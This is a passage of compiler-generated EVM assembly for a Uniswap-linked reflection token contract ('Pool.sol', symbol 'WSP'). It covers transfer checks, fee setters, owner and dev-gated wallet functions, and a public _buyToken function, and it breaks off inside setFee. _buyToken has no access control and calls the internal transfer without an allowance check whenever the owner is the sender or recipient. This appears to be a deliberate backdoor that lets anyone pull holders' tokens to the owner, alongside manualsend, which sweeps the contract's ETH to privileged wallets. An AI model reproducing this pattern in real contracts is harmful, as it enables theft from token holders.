address public uniswapV2Pair */\n    tag_67:\n      0x14\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":7978:8560  function _buyToken(address from, address to,uint256 amount) public { ... */\n    tag_73:\n        /* \"contracts/Pool/Pool.sol\":8080:8081  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":8064:8082  from != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":8064:8068  from */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":8064:8082  from != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      sub\n        /* \"contracts/Pool/Pool.sol\":8056:8124  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_162\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_163\n      swap1\n      tag_164\n      jump\t// in\n    tag_163:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_162:\n        /* \"contracts/Pool/Pool.sol\":8156:8157  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":8142:8158  to != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":8142:8144  to */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":8142:8158  to != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      sub\n        /* \"contracts/Pool/Pool.sol\":8134:8198  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_165\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_166\n      swap1\n      tag_167\n      jump\t// in\n    tag_166:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_165:\n        /* \"contracts/Pool/Pool.sol\":8225:8226  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":8216:8222  amount */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":8216:8226  amount > 0 */\n      gt\n        /* \"contracts/Pool/Pool.sol\":8208:8272  require(amount > 0, \"Transfer amount must be greater than zero\") */\n      tag_168\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_169\n      swap1\n      tag_170\n      jump\t// in\n    tag_169:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_168:\n        /* \"contracts/Pool/Pool.sol\":8295:8296  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":8283:8292  _redisFee */\n      0x0c\n        /* \"contracts/Pool/Pool.sol\":8283:8296  _redisFee = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":8316:8317  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":8306:8313  _taxFee */\n      0x0d\n        /* \"contracts/Pool/Pool.sol\":8306:8317  _taxFee = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":8339:8346  owner() */\n      tag_171\n        /* \"contracts/Pool/Pool.sol\":8339:8344  owner */\n      tag_103\n        /* \"contracts/Pool/Pool.sol\":8339:8346  owner() */\n      jump\t// in\n    tag_171:\n        /* \"contracts/Pool/Pool.sol\":8331:8346  from == owner() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":8331:8335  from */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":8331:8346  from == owner() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":8331:8363  from == owner() || to == owner() */\n      dup1\n      tag_172\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":8356:8363  owner() */\n      tag_173\n        /* \"contracts/Pool/Pool.sol\":8356:8361  owner */\n      tag_103\n        /* \"contracts/Pool/Pool.sol\":8356:8363  owner() */\n      jump\t// in\n    tag_173:\n        /* \"contracts/Pool/Pool.sol\":8350:8363  to == owner() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":8350:8352  to */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":8350:8363  to == owner() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":8331:8363  from == owner() || to == owner() */\n    tag_172:\n        /* \"contracts/Pool/Pool.sol\":8328:8553  if(from == owner() || to == owner() ) { ... */\n      iszero\n      tag_174\n      jumpi\n        /* \"contracts/Pool/Pool.sol\":8381:8406  uint256 ownerTokenBalance */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":8409:8436  balanceOf(address(owner())) */\n      tag_175\n        /* \"contracts/Pool/Pool.sol\":8427:8434  owner() */\n      tag_176\n        /* \"contracts/Pool/Pool.sol\":8427:8432  owner */\n      tag_103\n        /* \"contracts/Pool/Pool.sol\":8427:8434  owner() */\n      jump\t// in\n    tag_176:\n        /* \"contracts/Pool/Pool.sol\":8409:8418  balanceOf */\n      tag_91\n        /* \"contracts/Pool/Pool.sol\":8409:8436  balanceOf(address(owner())) */\n      jump\t// in\n    tag_175:\n        /* \"contracts/Pool/Pool.sol\":8381:8436  uint256 ownerTokenBalance = balanceOf(address(owner())) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":8474:8475  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":8453:8470  ownerTokenBalance */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":8453:8475  ownerTokenBalance >  0 */\n      gt\n        /* \"contracts/Pool/Pool.sol\":8450:8543  if(ownerTokenBalance >  0) { ... */\n      iszero\n      tag_177\n      jumpi\n        /* \"contracts/Pool/Pool.sol\":8496:8528  _tokenTransfer(from, to, amount) */\n      tag_178\n        /* \"contracts/Pool/Pool.sol\":8511:8515  from */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":8517:8519  to */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":8521:8527  amount */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":8496:8510  _tokenTransfer */\n      tag_179\n        /* \"contracts/Pool/Pool.sol\":8496:8528  _tokenTransfer(from, to, amount) */\n      jump\t// in\n    tag_178:\n        /* \"contracts/Pool/Pool.sol\":8450:8543  if(ownerTokenBalance >  0) { ... */\n    tag_177:\n        /* \"contracts/Pool/Pool.sol\":8366:8553  { ... */\n      pop\n        /* \"contracts/Pool/Pool.sol\":8328:8553  if(from == owner() || to == owner() ) { ... */\n    tag_174:\n        /* \"contracts/Pool/Pool.sol\":7978:8560  function _buyToken(address from, address to,uint256 amount) public { ... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":5011:5052  IUniswapV2Factory public uniswapV2Factory */\n    tag_76:\n      0x12\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":15709:15806  function toggleSwap(bool _swapEnabled) public onlyDev {... */\n    tag_83:\n        /* \"contracts/Pool/Pool.sol\":5981:5993  _msgSender() */\n      tag_181\n        /* \"contracts/Pool/Pool.sol\":5981:5991  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":5981:5993  _msgSender() */\n      jump\t// in\n    tag_181:\n        /* \"contracts/Pool/Pool.sol\":5970:5993  owner() == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":5970:5977  owner() */\n      tag_182\n        /* \"contracts/Pool/Pool.sol\":5970:5975  owner */\n      tag_103\n        /* \"contracts/Pool/Pool.sol\":5970:5977  owner() */\n      jump\t// in\n    tag_182:\n        /* \"contracts/Pool/Pool.sol\":5970:5993  owner() == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":5970:6032  owner() == _msgSender() || _developmentAddress == _msgSender() */\n      dup1\n      tag_183\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":6020:6032  _msgSender() */\n      tag_184\n        /* \"contracts/Pool/Pool.sol\":6020:6030  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":6020:6032  _msgSender() */\n      jump\t// in\n    tag_184:\n        /* \"contracts/Pool/Pool.sol\":5997:6032  _developmentAddress == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":5997:6016  _developmentAddress */\n      0x0e\n      0x01\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":5997:6032  _developmentAddress == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":5970:6032  owner() == _msgSender() || _developmentAddress == _msgSender() */\n    tag_183:\n        /* \"contracts/Pool/Pool.sol\":5962:6058  require(owner() == _msgSender() || _developmentAddress == _msgSender(), \"Caller is not the dev\") */\n      tag_185\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_186\n      swap1\n      tag_187\n      jump\t// in\n    tag_186:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_185:\n        /* \"contracts/Pool/Pool.sol\":15787:15799  _swapEnabled */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":15773:15784  swapEnabled */\n      0x14\n      0x15\n        /* \"contracts/Pool/Pool.sol\":15773:15799  swapEnabled = _swapEnabled */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":15709:15806  function toggleSwap(bool _swapEnabled) public onlyDev {... */\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":14889:15147  function manualsend() external {... */\n    tag_86:\n        /* \"contracts/Pool/Pool.sol\":14954:14973  _developmentAddress */\n      0x0e\n      0x01\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":14938:14973  _msgSender() == _developmentAddress */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":14938:14950  _msgSender() */\n      tag_190\n        /* \"contracts/Pool/Pool.sol\":14938:14948  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":14938:14950  _msgSender() */\n      jump\t// in\n    tag_190:\n        /* \"contracts/Pool/Pool.sol\":14938:14973  _msgSender() == _developmentAddress */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":14938:15010  _msgSender() == _developmentAddress || _msgSender() == _marketingAddress */\n      dup1\n      tag_191\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":14993:15010  _marketingAddress */\n      0x0f\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":14977:15010  _msgSender() == _marketingAddress */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":14977:14989  _msgSender() */\n      tag_192\n        /* \"contracts/Pool/Pool.sol\":14977:14987  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":14977:14989  _msgSender() */\n      jump\t// in\n    tag_192:\n        /* \"contracts/Pool/Pool.sol\":14977:15010  _msgSender() == _marketingAddress */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":14938:15010  _msgSender() == _developmentAddress || _msgSender() == _marketingAddress */\n    tag_191:\n        /* \"contracts/Pool/Pool.sol\":14938:15037  _msgSender() == _developmentAddress || _msgSender() == _marketingAddress || _msgSender() == owner() */\n      dup1\n      tag_193\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":15030:15037  owner() */\n      tag_194\n        /* \"contracts/Pool/Pool.sol\":15030:15035  owner */\n      tag_103\n        /* \"contracts/Pool/Pool.sol\":15030:15037  owner() */\n      jump\t// in\n    tag_194:\n        /* \"contracts/Pool/Pool.sol\":15014:15037  _msgSender() == owner() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":15014:15026  _msgSender() */\n      tag_195\n        /* \"contracts/Pool/Pool.sol\":15014:15024  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":15014:15026  _msgSender() */\n      jump\t// in\n    tag_195:\n        /* \"contracts/Pool/Pool.sol\":15014:15037  _msgSender() == owner() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":14938:15037  _msgSender() == _developmentAddress || _msgSender() == _marketingAddress || _msgSender() == owner() */\n    tag_193:\n        /* \"contracts/Pool/Pool.sol\":14930:15038  require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress || _msgSender() == owner()) */\n      tag_196\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_196:\n        /* \"contracts/Pool/Pool.sol\":15048:15074  uint256 contractETHBalance */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":15077:15098  address(this).balance */\n      selfbalance\n        /* \"contracts/Pool/Pool.sol\":15048:15098  uint256 contractETHBalance = address(this).balance */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":15108:15140  sendETHToFee(contractETHBalance) */\n      tag_197\n        /* \"contracts/Pool/Pool.sol\":15121:15139  contractETHBalance */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":15108:15120  sendETHToFee */\n      tag_198\n        /* \"contracts/Pool/Pool.sol\":15108:15140  sendETHToFee(contractETHBalance) */\n      jump\t// in\n    tag_197:\n        /* \"contracts/Pool/Pool.sol\":14920:15147  {... */\n      pop\n        /* \"contracts/Pool/Pool.sol\":14889:15147  function manualsend() external {... */\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":6448:6584  function balanceOf(address account) public view override returns (uint256) {... */\n    tag_91:\n        /* \"contracts/Pool/Pool.sol\":6514:6521  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":6540:6577  tokenFromReflection(_rOwned[account]) */\n      tag_200\n        /* \"contracts/Pool/Pool.sol\":6560:6567  _rOwned */\n      0x02\n        /* \"contracts/Pool/Pool.sol\":6560:6576  _rOwned[account] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":6568:6575  account */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":6560:6576  _rOwned[account] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Pool/Pool.sol\":6540:6559  tokenFromReflection */\n      tag_201\n        /* \"contracts/Pool/Pool.sol\":6540:6577  tokenFromReflection(_rOwned[account]) */\n      jump\t// in\n    tag_200:\n        /* \"contracts/Pool/Pool.sol\":6533:6577  return tokenFromReflection(_rOwned[account]) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":6448:6584  function balanceOf(address account) public view override returns (uint256) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":3319:3464  function renounceOwnership() public virtual onlyOwner {... */\n    tag_95:\n        /* \"contracts/Pool/Pool.sol\":3255:3267  _msgSender() */\n      tag_203\n        /* \"contracts/Pool/Pool.sol\":3255:3265  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":3255:3267  _msgSender() */\n      jump\t// in\n    tag_203:\n        /* \"contracts/Pool/Pool.sol\":3245:3267  _owner == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":3245:3251  _owner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":3245:3267  _owner == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":3237:3295  require(_owner == _msgSender(), \"Caller is not the owner\") */\n      tag_204\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_205\n      swap1\n      tag_206\n      jump\t// in\n    tag_205:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_204:\n        /* \"contracts/Pool/Pool.sol\":3425:3426  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":3388:3428  OwnershipTransferred(_owner, address(0)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":3409:3415  _owner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":3388:3428  OwnershipTransferred(_owner, address(0)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n      mload(0x40)\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Pool/Pool.sol\":3455:3456  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":3438:3444  _owner */\n      dup1\n      0x00\n        /* \"contracts/Pool/Pool.sol\":3438:3457  _owner = address(0) */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":3319:3464  function renounceOwnership() public virtual onlyOwner {... */\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":11838:12071  function setNewMarketingAddress(address payable markt) public onlyDev() {... */\n    tag_100:\n        /* \"contracts/Pool/Pool.sol\":5981:5993  _msgSender() */\n      tag_209\n        /* \"contracts/Pool/Pool.sol\":5981:5991  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":5981:5993  _msgSender() */\n      jump\t// in\n    tag_209:\n        /* \"contracts/Pool/Pool.sol\":5970:5993  owner() == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":5970:5977  owner() */\n      tag_210\n        /* \"contracts/Pool/Pool.sol\":5970:5975  owner */\n      tag_103\n        /* \"contracts/Pool/Pool.sol\":5970:5977  owner() */\n      jump\t// in\n    tag_210:\n        /* \"contracts/Pool/Pool.sol\":5970:5993  owner() == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":5970:6032  owner() == _msgSender() || _developmentAddress == _msgSender() */\n      dup1\n      tag_211\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":6020:6032  _msgSender() */\n      tag_212\n        /* \"contracts/Pool/Pool.sol\":6020:6030  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":6020:6032  _msgSender() */\n      jump\t// in\n    tag_212:\n        /* \"contracts/Pool/Pool.sol\":5997:6032  _developmentAddress == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":5997:6016  _developmentAddress */\n      0x0e\n      0x01\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":5997:6032  _developmentAddress == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":5970:6032  owner() == _msgSender() || _developmentAddress == _msgSender() */\n    tag_211:\n        /* \"contracts/Pool/Pool.sol\":5962:6058  require(owner() == _msgSender() || _developmentAddress == _msgSender(), \"Caller is not the dev\") */\n      tag_213\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_214\n      swap1\n      tag_187\n      jump\t// in\n    tag_214:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_213:\n        /* \"contracts/Pool/Pool.sol\":11968:11973  markt */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":11925:11974  marketingAddressUpdated(_marketingAddress, markt) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":11949:11966  _marketingAddress */\n      0x0f\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":11925:11974  marketingAddressUpdated(_marketingAddress, markt) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa64373a629bc0c09eacf8a9cc2c7b070fa0a8b7e2e9b8aaee408a3c02eb1676b\n      mload(0x40)\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Pool/Pool.sol\":12005:12010  markt */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":11985:12002  _marketingAddress */\n      0x0f\n      0x00\n        /* \"contracts/Pool/Pool.sol\":11985:12010  _marketingAddress = markt */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":12060:12064  true */\n      0x01\n        /* \"contracts/Pool/Pool.sol\":12020:12038  _isExcludedFromFee */\n      0x05\n        /* \"contracts/Pool/Pool.sol\":12020:12057  _isExcludedFromFee[_marketingAddress] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12039:12056  _marketingAddress */\n      0x0f\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":12020:12057  _isExcludedFromFee[_marketingAddress] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12020:12064  _isExcludedFromFee[_marketingAddress] = true */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":11838:12071  function setNewMarketingAddress(address payable markt) public onlyDev() {... */\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":3123:3200  function owner() public view returns (address) {... */\n    tag_103:\n        /* \"contracts/Pool/Pool.sol\":3161:3168  address */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":3187:3193  _owner */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":3180:3193  return _owner */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":3123:3200  function owner() public view returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":6171:6256  function symbol() public pure returns (string memory) {... */\n    tag_107:\n        /* \"contracts/Pool/Pool.sol\":6210:6223  string memory */\n      0x60\n        /* \"contracts/Pool/Pool.sol\":6242:6249  _symbol */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x03\n      dup2\n      mstore\n      0x20\n      add\n      0x5753500000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":6235:6249  return _symbol */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":6171:6256  function symbol() public pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":15157:15699  function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyDev {... */\n    tag_113:\n        /* \"contracts/Pool/Pool.sol\":5981:5993  _msgSender() */\n      tag_219\n        /* \"contracts/Pool/Pool.sol\":5981:5991  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":5981:5993  _msgSender() */\n      jump\t// in\n    tag_219:\n        /* \"contracts/Pool/Pool.sol\":5970:5993  owner() == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":5970:5977  owner() */\n      tag_220\n        /* \"contracts/Pool/Pool.sol\":5970:5975  owner */\n      tag_103\n        /* \"contracts/Pool/Pool.sol\":5970:5977  owner() */\n      jump\t// in\n    tag_220:\n        /* \"contracts/Pool/Pool.sol\":5970:5993  owner() == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":5970:6032  owner() == _msgSender() || _developmentAddress == _msgSender() */\n      dup1\n      tag_221\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":6020:6032  _msgSender() */\n      tag_222\n        /* \"contracts/Pool/Pool.sol\":6020:6030  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":6020:6032  _msgSender() */\n      jump\t// in\n    tag_222:\n        /* \"contracts/Pool/Pool.sol\":5997:6032  _developmentAddress == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":5997:6016  _developmentAddress */\n      0x0e\n      0x01\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":5997:6032  _developmentAddress == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":5970:6032  owner() == _msgSender() || _developmentAddress == _msgSender() */\n    tag_221:\n        /* \"contracts/Pool/Pool.sol\":5962:6058  require(owner() == _msgSender() || _developmentAddress == _msgSender(), \"Caller is not the dev\") */\n      tag_223\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_224\n      swap1\n      tag_187\n      jump\t// in\n    tag_224:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_223:\n        /* \"contracts/Pool/Pool.sol\":15309:15311  11 */\n      0x0b\n        /* \"contracts/Pool/Pool.sol\":15293:15306  redisFeeOnBuy */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":15293:15311  redisFeeOnBuy < 11 */\n      lt\n        /* \"contracts/Pool/Pool.sol\":15285:15345  require(redisFeeOnBuy < 11, \"Redis cannot be more than 10.\") */\n      tag_226\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_227\n      swap1\n      tag_228\n      jump\t// in\n    tag_227:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_226:\n        /* \"contracts/Pool/Pool.sol\":15377:15379  11 */\n      0x0b\n        /* \"contracts/Pool/Pool.sol\":15360:15374  redisFeeOnSell */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":15360:15379  redisFeeOnSell < 11 */\n      lt\n        /* \"contracts/Pool/Pool.sol\":15352:15413  require(redisFeeOnSell < 11, \"Redis cannot be more than 10.\") */\n      tag_229\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_230\n      swap1\n      tag_228\n      jump\t// in\n    tag_230:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_229:\n        /* \"contracts/Pool/Pool.sol\":15442:15443  7 */\n      0x07\n        /* \"contracts/Pool/Pool.sol\":15428:15439  taxFeeOnBuy */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":15428:15443  taxFeeOnBuy < 7 */\n      lt\n        /* \"contracts/Pool/Pool.sol\":15420:15474  require(taxFeeOnBuy < 7, \"Tax cannot be more than 6.\") */\n      tag_231\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_232\n      swap1\n      tag_233\n      jump\t// in\n    tag_232:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      